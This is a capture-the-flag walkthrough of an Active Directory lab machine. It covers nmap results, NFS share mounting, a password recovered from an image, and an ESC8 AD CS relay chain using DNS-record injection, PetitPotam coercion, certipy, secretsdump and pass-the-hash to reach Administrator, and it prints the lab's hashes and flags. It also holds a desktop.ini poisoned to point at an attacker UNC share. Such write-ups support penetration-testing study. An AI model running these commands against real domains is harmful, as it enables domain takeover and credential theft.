# Vulncicada
- DC-JPQ225.cicada.vl


## NMAP 
```
PORT     STATE SERVICE       VERSION                                                                                                                                                                              
53/tcp   open  domain        Simple DNS Plus       
80/tcp   open  http          Microsoft IIS httpd 10.0                                             
|_http-title: IIS Windows Server       
|_http-server-header: Microsoft-IIS/10.0
| http-methods:                                   
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-14 21:15:46Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)                                                           
| rpcinfo:
|   program version    port/proto  service         
|   100000  2,3,4        111/tcp   rpcbind                                                               
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind        
|   100003  2,3         2049/udp   nfs        
|   100003  2,3         2049/udp6  nfs                                                                                                                                                                            
|   100003  2,3,4       2049/tcp   nfs            
|   100003  2,3,4       2049/tcp6  nfs             
|   100005  1,2,3       2049/tcp   mountd                                                                
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd                                                                                                                                                                         
|   100021  1,2,3,4     2049/tcp   nlockmgr        
|   100021  1,2,3,4     2049/tcp6  nlockmgr                                                              
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status         
|   100024  1           2049/tcp6  status                                                                
|   100024  1           2049/udp   status                                                                
|_  100024  1           2049/udp6  status          
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-12-14T21:04:45
|_Not valid after:  2026-12-14T21:04:45
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-12-14T21:04:45
|_Not valid after:  2026-12-14T21:04:45
|_ssl-date: TLS randomness does not represent time
2049/tcp open  mountd        1-3 (RPC #100005)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-12-14T21:04:45
|_Not valid after:  2026-12-14T21:04:45
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-12-14T21:04:45
|_Not valid after:  2026-12-14T21:04:45
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-14T21:17:11+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2025-12-13T21:12:21
|_Not valid after:  2026-06-14T21:12:21
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows
```
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
56419/tcp open  unknown
56428/tcp open  unknown
56963/tcp open  unknown
63398/tcp open  unknown
63400/tcp open  unknown
63413/tcp open  unknown
```

## Foothold
- add `DC-JPQ225.cicada.vl cicada.vl DC-JPQ225` to `/etc/hosts`
- `showmount -e 10.129.234.48`
    - `/profiles`
- `sudo mount` profiles to find desktop.ini in Admin and Rosie.Powell
```
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21770
IconResource=%SystemRoot%\system32\imageres.dll,-112
IconFile=%SystemRoot%\system32\shell32.dll
IconIndex=-235

IconResource=\\10.10.14.183\share\ini_302
IconIndex=10.10.14.183
```
- poisoning the .ini does not work.
- checking the images, we see `Cicada123` on Rosie's image.
    - trying that with nxc
- `netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares`
    - without the proper `/etc/hosts` file, this will not work.
- we see there is a CertEnroll share.
- Checking the certificate configurations using certipy-ad
- get a TGT - `impacket-getTGT cicada.vl/Rosie.Powell -dc-ip 10.129.234.48`
    - `export KRB5CCNAME=/home/kali/`
- `certipy-ad find -u 'Rosie.Powell@cicada.vl' -p 'Cicada123' -target DC-JPQ225 -dc-ip 10.129.37.1 -vulnerable -enabled -text -k`
    - `ESC8 - Web Enrollment is enabled over HTTP.` for `cicada-DC-JPQ225-CA`
- Exploitation
    - `certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController -subject CN=DC-JPQ225,CN=Computer,DC=cicada,DC=vl`
    - `bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.183`
        - certificate to add of the form `computername + UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`
        - certificate added
    - `netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus`
        - shows vulnerable via DFSCoerce, PetitPotam, PrinterBug, MSEven
    - `netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam`
        - might have to repeat this a few times
        - we get a dc-jpq255.pfx file
    - `certipy-ad auth -pfx 'dc-jpq225.pfx' -dc-ip 10.129.234.48`
        - creates a ccache file and gives hash
        - [*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
    - `KRB5CCNAME=dc-jpq225.ccache impacket-secretsdump -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator`
        - `Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::`

- `impacket-getTGT -hashes :85a0da53871a9d56b6cd05deda3a5e87 cicada.vl/Administrator -dc-ip 10.129.234.48`
    - export this tgt
- `impacket-wmiexec -k cicada.vl/administrator@dc-jpq225.cicada.vl -no-pass`
- get user.txt - `2122424891b2cdadbb315847dfad2fe8`
- get root.txt - `b31f3fda70370b45def31ca39a3c934e`
